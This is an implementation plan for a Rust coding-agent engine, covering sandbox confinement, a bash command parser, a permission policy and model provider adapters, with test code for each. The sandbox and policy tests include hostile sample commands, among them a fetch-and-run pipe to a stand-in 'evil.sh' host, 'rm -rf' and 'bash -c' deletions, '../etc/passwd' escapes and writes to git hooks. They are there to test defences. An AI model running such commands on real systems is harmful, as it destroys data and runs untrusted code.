# Tautly Core Engine Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build sub-project 1 of `tautly`: a Rust, library-first agent engine with four provider adapters, a sandbox-gated tool set with model-adaptive edits, a code index, output filters, structured context with diff re-reads, context GC and state-preserving compaction, code-anchored memory, cheap side-model routing, an append-only session store, a JSON-RPC headless mode, a daily-driver line REPL, an ACP bridge, a tools-only MCP client, git checkpoints with undo, turn receipts, zero-config first run with `doctor`, installers, CI performance gates, an eval runner and a public benchmark kit, and the time-travel core (session-format hooks, rewind as fork, session tree, worktree forks, playback, compare, bisect).

**Architecture:** Cargo workspace of single-purpose crates with downward-only dependencies. `tautly-core::Engine` accepts `Command`s and emits a bounded stream of `Event`s; the REPL, the JSON-RPC server and the ACP bridge are thin consumers. All file and process access from tools goes through `tautly-sandbox::Sandbox`.

**Tech Stack:** Rust (edition 2024, MSRV 1.85), tokio, tokio-util (`CancellationToken`), futures, serde/serde_json, toml, thiserror/anyhow, reqwest (rustls, `stream`), eventsource-stream, blake3, tempfile, ignore + grep-searcher + grep-regex, globset, rayon, similar (diffs), serde_yaml (frontmatter), ulid, wiremock, assert_cmd, memory-stats, tree-sitter (+ rust, typescript, javascript, python, go, json, toml, yaml, bash grammars), htmd, rusqlite (`bundled`), keyring, clap, nix, tracing, proptest, insta; for the v1 scope additions: reedline (REPL), rpassword (hidden key input), toml_edit (writing user config), rmcp 3.8 (MCP client), agent-client-protocol 1.15 (ACP), cargo-dist (release tooling, not a crate dependency). opentelemetry is no longer used in v1 (Task 32 removed).

**Spec:** `docs/superpowers/specs/2026-11-02-hx-core-engine-design.md`

## Global Constraints

- License: Apache-2.0 (every crate's `Cargo.toml` sets `license = "Apache-2.0"`).
- Platforms: macOS and Linux only; `cfg(windows)` builds are not required in this sub-project.
- Auth: API keys from env vars or OS keychain only. No subscription OAuth, ever.
- Telemetry: none in v1 (OpenTelemetry export removed, Task 32). The `[telemetry]` table is reserved: parsed, ignored, `Warning` when `enabled = true` (Task 40). Nothing leaves the machine except provider, `web_fetch`, MCP and `doctor` network checks.
- Cold start < 50 ms; idle RSS < 30 MB; RSS within ±10% over 4-hour simulated session.
- Dependencies point downward only: `tautly-cli → {tautly-tui, tautly-rpc, tautly-acp} → tautly-core → {tautly-provider, tautly-tools, tautly-context, tautly-memory, tautly-index, tautly-session, tautly-sandbox, tautly-mcp}`; `tautly-mcp → {tautly-tools, tautly-sandbox}`; `tautly-tools → {tautly-sandbox, tautly-provider, tautly-index, tautly-memory, tautly-session}`; `tautly-memory → {tautly-index, tautly-session}`; `tautly-index → tautly-sandbox`; `tautly-context → {tautly-provider, tautly-tools, tautly-index, tautly-sandbox}`.
- `tautly-tools` must not call `std::fs::*`, `tokio::fs::*`, `std::process::Command`, `tokio::process::Command` directly (enforced by `clippy::disallowed_methods`/`disallowed_types`).
- Errors: `thiserror` per crate; `anyhow` only in `tautly-cli`. No `panic = "abort"`.
- Naming: the package in `crates/tautly-cli` is named `tautly` (cargo-dist names release artifacts after the package; `cargo install tautly`, `cargo binstall tautly`). Use `-p tautly`; "tautly-cli" in this plan still names that crate by its directory.
- Paths: config `~/.config/tautly/config.toml`, project `.tautly/config.toml`, sessions `~/.local/share/tautly/sessions/<project-id>/<session-id>.jsonl` (+ `blobs/`; `<project-id>` = blake3 of the git common dir, else of the root, Task 48), ledger `~/.local/share/tautly/ledger.sqlite` (+ `receipts` table), worktree forks and bisect worktrees `~/.local/share/tautly/worktrees/<project-id>/<id>`, working-tree leases `~/.local/share/tautly/locks/<root-hash>.lock`, REPL history `~/.local/share/tautly/repl_history`, MCP approvals `~/.local/share/tautly/mcp-approvals.json`, checkpoint refs `refs/tautly/checkpoints/<session>/<n>` in the user's repository. Honor `XDG_CONFIG_HOME` / `XDG_DATA_HOME` and an `TAUTLY_HOME` override (used by tests).
- Fixed values: bash timeout 120 s; tool output cap 30 KB (head + tail); max 5 retry attempts; compaction threshold 80%; budget warning 80%; system prompt < 2,000 tokens; pinned warning at 10% of window; cancel kills children within 200 ms.
- Token-efficiency values: diff re-read when < 50% of lines changed; context GC threshold max(2,000 tokens, 5% of window), only at step start (before each provider request); output filters apply above 2 KB, ≤ 20 detail lines per item; memory index ≤ 500 tokens; cache scheduler: default cache TTL 300 s, warm-cache benefit multiplier 5, forced mutation at ≥ 90% of window, threshold compaction deferrable from 80% to 90%; loop breaker: failed-attempts list 10 entries / ≤ 300 tokens, previous-result excerpt 5 lines; tolerant edits: anchor interior similarity ≥ 0.9, structural similarity ≥ 0.8, nearest-window ≤ 20 lines; memory entry body ≤ 300 tokens; `recall` top 5, ≤ 2,000 tokens; `web_fetch` question answers ≤ 1,000 tokens; index build of 10,000 files < 10 s, single-file reindex < 50 ms; token regression gate 10%.
- Workspace engine: watcher debounce 50 ms; trigram literal minimum 3 bytes; `find` default limit 20 (max 50); batched read ≤ 10 targets; repo map ≤ 400 tokens; selective trigram grep on 100,000 files < 50 ms; tree glob < 5 ms.
- v1 scope additions (user-approved 2026-11-03, spec 7.11): savings estimate 4 bytes/token; diff preview cap 200 lines / 16 KB, session diff cap 2,000 lines; Ollama probe 300 ms; `doctor` network timeout 3 s; MCP startup wait 5,000 ms, call timeout 120 s, ≤ 50 tools per server, description ≤ 1 KB, input schema ≤ 8 KB, tool name ≤ 64 chars; checkpoint timeout 3,000 ms, untracked limits 200 MB / 20,000 files, refs kept 14 days; REPL history 1,000 entries, double Ctrl+C window 2 s; ACP tool output ≤ 8 KB, ACP diff content ≤ 256 KB per side.
- Time travel (spec 7.12): steps are absolute 1-based provider steps ("at N" keeps steps 1..N); replay gaps capped at 2 s; compare takes 2–5 sessions; bisect run timeout 600 s, exit 0 good / 125 skip / other bad; record timestamps are unix ms.
- Protocol: new `Event`/`Command` variants and fields are additions (optional or `#[serde(default)]`); `PROTOCOL_VERSION` stays `(1, 0)` because nothing has been released yet.
- Exit codes for `tautly -p`: 0 completed, 1 error, 2 budget/max_turns/timeout, 130 cancelled.

## Execution Order

Tasks run in this order (numbers are identities, not sequence):

1. Tasks 1–25 and 36–38 are done (36–37 ran right after Task 15, 38 right after Task 19).
2. **Engine:** 48 (session-format hooks) → 26 → 27 → 28 → **checkpoint 4** (whole-branch review, as before).
3. **Engine-side v1 additions:** 42 (diffs) → 43 (SetModel) → 44 (CLAUDE.md fallback, evidence footer) → 47 (git checkpoints, undo).
4. **Clients and CLI:** 29 → 31 → 39 (receipts, stats) → 40 (zero-config, doctor, auth add) → 45 (MCP client) → 30 (daily-driver REPL) → 46 (ACP bridge).
5. **Time travel:** 49 (rewind as fork, session tree, switch) → 50 (worktree fork at step N) → 51 (playback) → 52 (compare) → 53 (bisect).
6. **Release:** 41 (release, installers) → **checkpoint 5** (whole-branch review of Tasks 29–31 and 39–53).
7. **Gates and acceptance:** 33 → 34 → 35.
8. **Final whole-branch v1 review** on Fable (`claude-fable-5-1`, user request 2026-11-03).

Task 32 is removed from v1 and is not executed.

## Review Focus

1. **Binary or non-UTF-8 files** passed to `read`/`edit`/`grep` — expect a clear tool error ("binary file", "not UTF-8"), never a panic or mangled write. Test in Task 9 and Task 11.
2. **Malformed tool-call arguments from the model** (invalid JSON, missing fields, wrong types) — expect an error tool result returned to the model and the turn continuing. Test in Task 24.
3. **Two `tautly` processes on the same project** (concurrent sessions, shared ledger) — expect both to work: separate session files, SQLite in WAL mode with busy timeout. Test in Task 18 and Task 25.
4. **Terminal closed / SIGTERM / SIGHUP mid-turn** — expect child process groups killed and the session left resumable. Test in Task 25.
5. **Symlink tricks and loops** inside the workspace (link pointing outside root, cyclic links during `glob`/`grep`) — expect confinement errors and no hang. Test in Task 1 and Task 9.
6. **Repository-declared MCP servers** (project `[mcp.servers]`, repo `.mcp.json`):
   - Expect none to start without a recorded approval keyed by root + launch hash, and any change to the command to ask again.
   - Headless never starts one without `--approve-mcp`.
   - No server process sees a provider API key.

   Test in Task 45.
7. **Checkpoints touching user git state:**
   - Expect the user's index, HEAD, branches, stash and ignored files to be byte-identical before and after a checkpoint and after an undo; only objects and `refs/tautly/` change.
   - Git runs with fsmonitor and hooks disabled.
   - A slow or huge tree is skipped, not hung.

   Test in Task 47.
8. **Approved diff ≠ applied diff:** expect a file changed between approval and execution to fail as stale, and the diff a user approves to be exactly what is written. Test in Task 42.
9. **Session "always" rules widening permissions:**
   - Expect a session rule to never persist (not even across resume) and to never override a deny rule or a protected path.
   - A rule that does not match the pending call is refused.

   Test in Task 30.
10. **First-run detection sending keys to the wrong host:** expect keys only from env or keychain, sent only to their provider's configured host (in a header), and never read from repository files. Test in Task 40.
11. **Rewind or switch clobbering human edits:**
    - Expect every path whose disk content differs from the agent's recorded tip to be reported as a conflict.
    - Nothing is written unless that path is in `overwrite`.
    - A backup ref is taken before any write.
    - The abandoned branch's log stays unmodified (except its tip checkpoint) and stays switchable.

    Test in Task 49.
12. **Two sessions writing one working tree during rewind or switch:** expect the exclusive lease to refuse. Test in Task 49.
13. **Replays and forks treating logged approvals as consent:** expect replay to make no provider or tool calls, and forks to re-decide every call by the current policy. Test in Tasks 50 and 51.
14. **Record paths escaping the root:** expect root-relative record paths with `..`, absolute paths or NUL to be refused on read, and records copied into a worktree fork to resolve under the new root only. Test in Task 48.

---

## File Structure

```
Cargo.toml                      workspace, shared deps, lints
clippy.toml                     (root) disallowed methods for tautly-tools via crate-level config
.github/workflows/ci.yml        test, clippy, perf gates
crates/
  tautly-sandbox/src/{lib.rs, effect.rs, local.rs, shell.rs, policy.rs, protected.rs}
  tautly-provider/src/{lib.rs, canonical.rs, capabilities.rs, catalog.rs, cost.rs, error.rs, retry.rs, mock.rs, sse.rs,
                   anthropic.rs, openai.rs, google.rs, compat.rs}
  tautly-provider/catalog/models.toml
  tautly-provider/tests/fixtures/{anthropic,openai,google,compat}/*.sse
  tautly-index/src/{lib.rs, extract.rs, store.rs, update.rs}, tautly-index/queries/<lang>.scm
  tautly-memory/src/{lib.rs, entry.rs, store.rs, stale.rs, search.rs, episodes.rs, consolidate.rs}
  tautly-tools/src/{lib.rs, spec.rs, read.rs, write.rs, grep.rs, glob.rs, bash.rs, web_fetch.rs, pin_state.rs, index_tools.rs, memory_tools.rs,
                filters/{mod.rs, cargo.rs, pytest.rs, jest.rs, gotest.rs, tsc.rs, eslint.rs},
                edit/{mod.rs, guard.rs, atomic.rs, str_replace.rs, patch.rs, hashline.rs, syntax.rs}}
  tautly-tools/clippy.toml
  tautly-session/src/{lib.rs, record.rs, writer.rs, reader.rs, blobs.rs, paths.rs}
  tautly-context/src/{lib.rs, blocks.rs, tokens.rs, pinned.rs, state.rs, agents_md.rs, assemble.rs, compact.rs, gc.rs, prompt.rs}
  tautly-context/prompts/system.md
  tautly-core/src/{lib.rs, protocol.rs, config.rs, auth.rs, engine.rs, turn.rs, approvals.rs, budget.rs, ledger.rs,
               resume.rs, routing.rs, memory.rs, telemetry.rs}
  tautly-rpc/src/{lib.rs, jsonrpc.rs, server.rs, oneshot.rs}
  tautly-tui/src/{lib.rs, repl.rs, render.rs, input.rs, approve.rs, slash.rs}
  tautly-mcp/src/{lib.rs, config.rs, client.rs, tool.rs, names.rs, approvals.rs}
  tautly-acp/src/{lib.rs, bridge.rs, map.rs, permission.rs}
  tautly-core/src/{receipt.rs, detect.rs, diff.rs, evidence.rs, checkpoint.rs}   (v1 additions)
  tautly-core/src/{timetravel.rs, lease.rs, tree.rs, worktree.rs, replay.rs, compare.rs, bisect.rs}   (time travel)
  tautly-cli/src/cmd/{fork.rs, replay.rs, compare.rs, bisect.rs}
  tautly-cli/src/{main.rs, cmd/{prompt.rs, sessions.rs, models.rs, undo.rs, eval.rs, stats.rs, receipt.rs, auth.rs, doctor.rs, mcp.rs}}
dist-workspace.toml, .github/workflows/release.yml   cargo-dist release
benchmarks/{terminal-bench,tokens}/, docs/benchmark.md   public benchmark kit
evals/starter/<task-id>/{task.toml, setup.sh, verify.sh}
evals/replay/<task-id>.json      scripted mock sessions for the token regression gate
evals/baseline.json              committed tokens-per-solved-task baseline
benches/perf/{startup.sh, soak.rs, big_output.rs}
```

---

### Task 1: Workspace scaffold and `tautly-sandbox` confinement

**Files:**
- Create: `Cargo.toml`, `crates/tautly-sandbox/Cargo.toml`, `crates/tautly-sandbox/src/{lib.rs,effect.rs,local.rs}`, `.github/workflows/ci.yml` (cargo test + clippy `-D warnings` on ubuntu-latest and macos-latest)
- Test: `crates/tautly-sandbox/tests/confinement.rs`

**Interfaces:**
- Produces:
  - `enum Effect { ReadOnly, Write { paths: Vec<PathBuf> }, Exec { argv: Vec<String> } }`
  - `#[async_trait] trait Sandbox: Send + Sync { fn root(&self) -> &Path; fn resolve(&self, p: &Path) -> Result<PathBuf, SandboxError>; async fn read(&self, p: &Path) -> Result<Vec<u8>, SandboxError>; async fn metadata(&self, p: &Path) -> Result<FileMeta, SandboxError>; async fn write_atomic(&self, p: &Path, bytes: &[u8], mode: Option<u32>) -> Result<(), SandboxError>; async fn spawn(&self, spec: SpawnSpec) -> Result<Child, SandboxError>; fn walker(&self, base: &Path) -> Result<ignore::WalkBuilder, SandboxError>; async fn http_get(&self, url: &Url) -> Result<HttpResponse, SandboxError>; }`
  - `struct FileMeta { mtime: SystemTime, len: u64, mode: u32 }`
  - `struct SpawnSpec { argv: Vec<String>, cwd: PathBuf, env: Vec<(String,String)>, new_process_group: bool }`
  - `struct LocalSandbox::new(root: PathBuf) -> Result<Self, SandboxError>`
  - `enum SandboxError { OutsideRoot(PathBuf), Io(std::io::Error), Network(String), Denied(String) }`

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn resolve_rejects_parent_escape() {
    let (_t, sb) = sandbox();
    assert!(matches!(sb.resolve(Path::new("../etc/passwd")), Err(SandboxError::OutsideRoot(_))));
}
#[tokio::test] async fn resolve_rejects_symlink_pointing_outside() {
    let (t, sb) = sandbox();
    std::os::unix::fs::symlink("/etc", t.path().join("link")).unwrap();
    assert!(matches!(sb.resolve(Path::new("link/passwd")), Err(SandboxError::OutsideRoot(_))));
}
#[tokio::test] async fn resolve_allows_new_file_in_existing_dir() {
    let (t, sb) = sandbox();
    assert_eq!(sb.resolve(Path::new("new.txt")).unwrap(), t.path().canonicalize().unwrap().join("new.txt"));
}
#[tokio::test] async fn write_atomic_then_read_roundtrip_preserves_mode() { /* write with mode 0o755, read back bytes equal, metadata.mode & 0o777 == 0o755 */ }
#[tokio::test] async fn walker_survives_symlink_cycle() {
    let (t, sb) = sandbox();
    std::os::unix::fs::symlink(t.path(), t.path().join("loop")).unwrap();
    let n = sb.walker(Path::new(".")).unwrap().follow_links(true).build().count();
    assert!(n < 100); // terminates
}
```

- [ ] **Step 2: Run** `cargo test -p tautly-sandbox` — Expected: FAIL (crate items missing).
- [ ] **Step 3: Implement** `effect.rs`, `local.rs`. `resolve`: join to root, canonicalize the longest existing ancestor, re-append the non-existent tail, reject if not `starts_with(canonical_root)`. `write_atomic`: `tempfile::NamedTempFile::new_in(parent)`, write, `sync_all`, set permissions, `persist`. `spawn`: `tokio::process::Command` with `process_group(0)` when requested, `kill_on_drop(true)`. `http_get`: reqwest, 10 MB body cap.
- [ ] **Step 4: Run** `cargo test -p tautly-sandbox` — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(sandbox): workspace scaffold, Sandbox trait, LocalSandbox confinement"`

### Task 2: Shell command parser

**Files:**
- Create: `crates/tautly-sandbox/src/shell.rs`
- Test: `crates/tautly-sandbox/tests/shell.rs`

**Interfaces:**
- Produces: `fn parse_commands(src: &str) -> Result<Vec<SimpleCommand>, Unparseable>`; `struct SimpleCommand { argv: Vec<String>, redirects: Vec<Redirect> }`; `struct Redirect { target: String, write: bool }`.

- [ ] **Step 1: Write the failing tests**

```rust
#[test] fn splits_pipes_and_lists() {
    let c = parse_commands("cargo test && git status | head -n 5; ls").unwrap();
    assert_eq!(argv0s(&c), ["cargo", "git", "head", "ls"]);
}
#[test] fn descends_into_subshell_and_substitution() {
    let c = parse_commands("echo $(rm -rf /tmp/x) && (cd a && make)").unwrap();
    assert_eq!(argv0s(&c), ["echo", "rm", "cd", "make"]);
}
#[test] fn captures_write_redirects() {
    let c = parse_commands("echo hi > .git/hooks/pre-commit").unwrap();
    assert_eq!(c[0].redirects, vec![Redirect { target: ".git/hooks/pre-commit".into(), write: true }]);
}
#[test] fn unbalanced_quote_is_unparseable() { assert!(parse_commands("echo 'oops").is_err()); }
#[test] fn eval_and_bash_dash_c_are_unparseable() {
    assert!(parse_commands("eval \"$X\"").is_err());
    assert!(parse_commands("bash -c 'rm -rf /'").is_err());
}
```

- [ ] **Step 2: Run** `cargo test -p tautly-sandbox --test shell` — Expected: FAIL.
- [ ] **Step 3: Implement** with `tree-sitter-bash`: walk the tree collecting `command` nodes (including inside `command_substitution`, `subshell`, `process_substitution`); any `ERROR` node → `Unparseable`; `eval`, `source`, `.`, and `{bash,sh,zsh} -c` → `Unparseable` (cannot be statically analyzed). Unquote words; variable expansions stay literal (`$X`).
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(sandbox): tree-sitter-bash command parser"`

### Task 3: Permission policy and protected paths

**Files:**
- Create: `crates/tautly-sandbox/src/{policy.rs,protected.rs}`
- Test: `crates/tautly-sandbox/tests/policy.rs`

**Interfaces:**
- Consumes: `Effect`, `parse_commands`.
- Produces: `enum Mode { Ask, AutoEdit, Yolo }`; `enum Decision { Allow, Ask { reason: String }, Deny { rule: String } }`; `struct PolicyConfig { mode: Mode, allow: Vec<String>, deny: Vec<String> }` (serde, rule syntax `tool(glob)`); `struct Policy::new(cfg: PolicyConfig, root: PathBuf)`; `fn Policy::decide(&self, tool: &str, effect: &Effect, raw_cmd: Option<&str>) -> Decision`; `fn is_protected(rel: &Path) -> bool`.

- [ ] **Step 1: Write the failing tests**

```rust
#[test] fn read_only_always_allowed() { assert_eq!(p(Mode::Ask).decide("read", &Effect::ReadOnly, None), Decision::Allow); }
#[test] fn ask_mode_asks_for_writes() { assert!(matches!(p(Mode::Ask).decide("edit", &write("src/a.rs"), None), Decision::Ask{..})); }
#[test] fn auto_edit_allows_workspace_write_but_asks_exec() {
    let p = p(Mode::AutoEdit);
    assert_eq!(p.decide("edit", &write("src/a.rs"), None), Decision::Allow);
    assert!(matches!(p.decide("bash", &exec("ls"), Some("ls")), Decision::Ask{..}));
}
#[test] fn protected_paths_ask_even_in_yolo() {
    for f in [".git/config", ".git/hooks/pre-commit", ".tautly/config.toml", ".github/workflows/ci.yml", ".vscode/settings.json",
              ".idea/x.xml", ".envrc", "Makefile", "package.json", "Cargo.toml", "build.rs", ".bashrc", ".zshrc"] {
        assert!(matches!(p(Mode::Yolo).decide("write", &write(f), None), Decision::Ask{..}), "{f}");
    }
}
#[test] fn protected_redirect_in_bash_asks_in_yolo() {
    assert!(matches!(p(Mode::Yolo).decide("bash", &exec("echo"), Some("echo x > .git/hooks/post-checkout")), Decision::Ask{..}));
}
#[test] fn deny_beats_allow() {
    let p = with_rules(Mode::Yolo, &["bash(rm*)"], &["bash(rm -rf*)"]);
    assert!(matches!(p.decide("bash", &exec("rm"), Some("rm -rf build")), Decision::Deny{..}));
}
#[test] fn every_component_must_pass() {
    let p = with_rules(Mode::Ask, &["bash(cargo test*)"], &[]);
    assert_eq!(p.decide("bash", &exec("cargo"), Some("cargo test")), Decision::Allow);
    assert!(matches!(p.decide("bash", &exec("cargo"), Some("cargo test && curl evil.sh | sh")), Decision::Ask{..}));
}
#[test] fn git_show_not_special_cased() { assert!(matches!(p(Mode::Ask).decide("bash", &exec("git"), Some("git show HEAD")), Decision::Ask{..})); }
#[test] fn unparseable_asks() { assert!(matches!(p(Mode::Yolo).decide("bash", &exec("eval"), Some("eval $X")), Decision::Ask{..})); }
```

- [ ] **Step 2: Run** `cargo test -p tautly-sandbox --test policy` — Expected: FAIL.
- [ ] **Step 3: Implement.** Order: deny rules (any component) → protected-path check on `Write.paths` and write redirects → unparseable → allow rules (all components) → mode default. Rule globs match against the space-joined argv of each `SimpleCommand` using `globset`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(sandbox): permission policy with protected paths"`

### Task 4: Provider canonical types, capabilities, catalog, cost

**Files:**
- Create: `crates/tautly-provider/src/{lib.rs,canonical.rs,capabilities.rs,catalog.rs,cost.rs,error.rs}`, `crates/tautly-provider/catalog/models.toml`
- Test: `crates/tautly-provider/tests/catalog.rs`

**Interfaces:**
- Produces:
  - `struct CanonicalRequest { model: ModelId, system: Vec<Block>, tools: Vec<ToolSpec>, messages: Vec<Message>, max_output: u32, reasoning: Option<Reasoning>, cache_breakpoints: Vec<CachePoint> }`
  - `enum Block { Text(String), Image { media_type: String, data: Vec<u8> } }`; `struct Message { role: Role, content: Vec<Content> }`; `enum Content { Text(String), ToolUse { id: String, name: String, input: Value }, ToolResult { id: String, output: String, is_error: bool }, Reasoning { text: String, signature: Option<String> } }`
  - `struct ToolSpec { name: String, description: String, schema: Value }`; `enum Reasoning { Budget(u32), Effort(Effort) }`; `enum CachePoint { AfterSystem, AfterTools, AfterMessage(usize) }`
  - `enum ProviderEvent { TextDelta(String), ReasoningDelta(String), ToolCall { id: String, name: String, input_json: String }, Usage(RawUsage), Quota(Quota), Done { stop: StopReason } }`
  - `struct RawUsage { input: u64, output: u64, cache_read: u64, cache_write: u64 }`; `struct Quota { remaining_requests: Option<u64>, remaining_tokens: Option<u64>, reset_at: Option<SystemTime> }`
  - `struct Capabilities { context_window: u32, max_output: u32, parallel_tools: bool, reasoning: ReasoningStyle, cache: CacheStyle, images: bool, edit_format: EditFormat }`; `enum EditFormat { StrReplace, Patch, Hashline }`
  - `struct Catalog::builtin() -> Catalog`; `fn Catalog::merge(&mut self, overrides: Catalog)`; `fn Catalog::get(&self, id: &ModelId) -> ModelInfo` (unknown → conservative defaults: 32k window, 4k output, no parallel, no cache, no images, Hashline, prices None)
  - `struct ModelInfo { caps: Capabilities, price: Option<Price> }`; `struct Price { input: f64, output: f64, cache_read: f64, cache_write: f64 }` (USD per million tokens)
  - `fn cost_usd(u: &RawUsage, p: Option<&Price>) -> Option<f64>`
  - `enum ProviderError { Transient { status: Option<u16>, retry_after: Option<Duration>, msg: String }, Auth(String), InvalidRequest(String), ContextOverflow(String), Other(String) }`

- [ ] **Step 1: Write the failing tests**

```rust
#[test] fn builtin_catalog_has_each_provider_family() { for id in ["anthropic/claude-sonnet-5-5","openai/gpt-5","google/gemini-3-pro"] { assert!(Catalog::builtin().contains(&id.into()), "{id}"); } }
#[test] fn default_edit_formats_match_spec() {
    let c = Catalog::builtin();
    assert_eq!(c.get(&"anthropic/claude-sonnet-5-5".into()).caps.edit_format, EditFormat::StrReplace);
    assert_eq!(c.get(&"openai/gpt-5".into()).caps.edit_format, EditFormat::Patch);
    assert_eq!(c.get(&"google/gemini-3-pro".into()).caps.edit_format, EditFormat::StrReplace);
    assert_eq!(c.get(&"compat/some-local".into()).caps.edit_format, EditFormat::Hashline);
}
#[test] fn unknown_model_cost_is_none() { assert_eq!(cost_usd(&u(1000,1000,0,0), None), None); }
#[test] fn cost_math() { let p = Price{input:3.0,output:15.0,cache_read:0.3,cache_write:3.75};
    assert!((cost_usd(&u(1_000_000, 100_000, 2_000_000, 0), Some(&p)).unwrap() - (3.0+1.5+0.6)).abs() < 1e-9); }
#[test] fn override_merges_by_id() { /* override price of one model, others untouched */ }
```

- [ ] **Step 2: Run** `cargo test -p tautly-provider --test catalog` — Expected: FAIL.
- [ ] **Step 3: Implement.** `models.toml` entries keyed `"<provider>/<model>"`; populate current Anthropic, OpenAI, Google models with published prices at implementation time. If the three model ids used in these tests are not the current flagship ids, replace them in the tests and in Task 35 with the ids you put in the catalog. `include_str!` the catalog.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(provider): canonical types, capabilities, catalog, cost"`

### Task 5: `Provider` trait, retry wrapper, `MockProvider`

**Files:**
- Create: `crates/tautly-provider/src/{retry.rs,mock.rs}`; modify `lib.rs`
- Test: `crates/tautly-provider/tests/retry.rs`

**Interfaces:**
- Produces:
  - `trait Provider: Send + Sync { fn name(&self) -> &str; fn stream(&self, req: CanonicalRequest, cancel: CancellationToken) -> BoxStream<'static, Result<ProviderEvent, ProviderError>>; }`
  - `struct Retrying<P> { inner: P, max_attempts: u32 /* 5 */, base: Duration /* 500ms */ }` implementing `Provider`; retries only if the error is `Transient` **and no event has been yielded yet for this attempt**; otherwise surfaces the error.
  - `struct MockProvider::new(script: Vec<MockTurn>)`; `enum MockTurn { Events(Vec<ProviderEvent>), Error(ProviderError), DropAfter(Vec<ProviderEvent>) /* yields then Transient */, Stall }`; `fn MockProvider::requests(&self) -> Vec<CanonicalRequest>` (records what it received).

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test(start_paused = true)] async fn retries_transient_then_succeeds() {
    let m = MockProvider::new(vec![MockTurn::Error(transient()), MockTurn::Error(transient()), MockTurn::Events(vec![text("ok"), done()])]);
    let out = collect(Retrying::new(m.clone()).stream(req(), CancellationToken::new())).await;
    assert_eq!(out, vec![text("ok"), done()]); assert_eq!(m.requests().len(), 3);
}
#[tokio::test(start_paused = true)] async fn honors_retry_after() { /* retry_after=7s → elapsed paused clock >= 7s */ }
#[tokio::test(start_paused = true)] async fn gives_up_after_five_attempts() { /* 6 transients → Err(Transient), requests()==5 */ }
#[tokio::test] async fn auth_error_not_retried() { /* requests()==1 */ }
#[tokio::test] async fn mid_stream_drop_surfaces_error_without_retry() { /* DropAfter([text("a")]) → [Ok(text a), Err(Transient)]; engine owns re-issue */ }
#[tokio::test] async fn cancel_stops_stall() { /* Stall + cancel after 10ms → stream ends within 50ms */ }
```

- [ ] **Step 2: Run** `cargo test -p tautly-provider --test retry` — Expected: FAIL.
- [ ] **Step 3: Implement.** Backoff `base * 2^attempt` with ±25% jitter, replaced by `retry_after` when present.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(provider): Provider trait, retry wrapper, MockProvider"`

### Task 6: Anthropic adapter

**Files:**
- Create: `crates/tautly-provider/src/{sse.rs,anthropic.rs}`, `crates/tautly-provider/tests/fixtures/anthropic/{text.sse,tool_use_parallel.sse,thinking.sse,overloaded_529.sse,context_overflow.json}`
- Test: `crates/tautly-provider/tests/anthropic.rs`

**Interfaces:**
- Consumes: Task 4 types, `Provider`.
- Produces: `struct AnthropicProvider::new(api_key: String, base_url: Url, catalog: Arc<Catalog>)`; `fn to_wire(req: &CanonicalRequest) -> serde_json::Value` (pub for tests); `fn sse::events(body: impl Stream<Item=Bytes>) -> impl Stream<Item=Result<SseEvent, ProviderError>>`.

- [ ] **Step 1: Write the failing tests** (fixtures served by a local `wiremock` server)

```rust
#[test] fn cache_breakpoints_become_cache_control() {
    let w = to_wire(&req_with(vec![CachePoint::AfterSystem, CachePoint::AfterTools, CachePoint::AfterMessage(3)]));
    assert_eq!(w["system"].as_array().unwrap().last().unwrap()["cache_control"]["type"], "ephemeral");
    assert_eq!(w["tools"].as_array().unwrap().last().unwrap()["cache_control"]["type"], "ephemeral");
    assert!(w["messages"][3]["content"].as_array().unwrap().last().unwrap()["cache_control"].is_object());
}
#[test] fn reasoning_budget_maps_to_thinking() { assert_eq!(to_wire(&req_reasoning(Reasoning::Budget(8000)))["thinking"]["budget_tokens"], 8000); }
#[tokio::test] async fn parses_parallel_tool_use_fixture() { /* two ToolCall events with complete input_json, then Usage, Done{ToolUse} */ }
#[tokio::test] async fn parses_usage_with_cache_tokens() { /* cache_read/cache_write populated */ }
#[tokio::test] async fn rate_limit_headers_become_quota() { /* anthropic-ratelimit-requests-remaining / tokens-remaining / reset → Quota */ }
#[tokio::test] async fn status_529_is_transient_and_413_prompt_too_long_is_context_overflow() {}
```

- [ ] **Step 2: Run** `cargo test -p tautly-provider --test anthropic` — Expected: FAIL.
- [ ] **Step 3: Implement.** Messages API, `anthropic-version: 2023-06-01`, `stream: true`. Accumulate `input_json_delta` per content block index; emit `ToolCall` at `content_block_stop`. Record fixtures from the real API once and commit them (scrub keys).
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(provider): Anthropic adapter"`

### Task 7: OpenAI Responses adapter

**Files:**
- Create: `crates/tautly-provider/src/openai.rs`, fixtures under `tests/fixtures/openai/`
- Test: `crates/tautly-provider/tests/openai.rs`

**Interfaces:**
- Produces: `struct OpenAiProvider::new(api_key: String, base_url: Url, catalog: Arc<Catalog>)`; `fn to_wire(req: &CanonicalRequest, prev: Option<&str>) -> Value`.

- [ ] **Step 1: Write the failing tests:** `reasoning_effort_maps` (`Reasoning::Effort(High)` → `reasoning.effort == "high"`); `function_call_fixture_parses` (`response.function_call_arguments.delta`/`.done` → one `ToolCall`); `usage_maps_cached_tokens` (`input_tokens_details.cached_tokens` → `cache_read`); `x_ratelimit_headers_become_quota`; `previous_response_id_used_only_when_prefix_unchanged` (`to_wire(req, Some("resp_1"))` sends only new items and `previous_response_id`).
- [ ] **Step 2: Run** `cargo test -p tautly-provider --test openai` — Expected: FAIL.
- [ ] **Step 3: Implement** against `/v1/responses` with `stream: true`. Track last response id + hash of sent prefix inside the provider; reuse only when the new request's prefix hash matches.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(provider): OpenAI Responses adapter"`

### Task 8: Google and OpenAI-compatible adapters

**Files:**
- Create: `crates/tautly-provider/src/{google.rs,compat.rs}`, fixtures under `tests/fixtures/{google,compat}/`
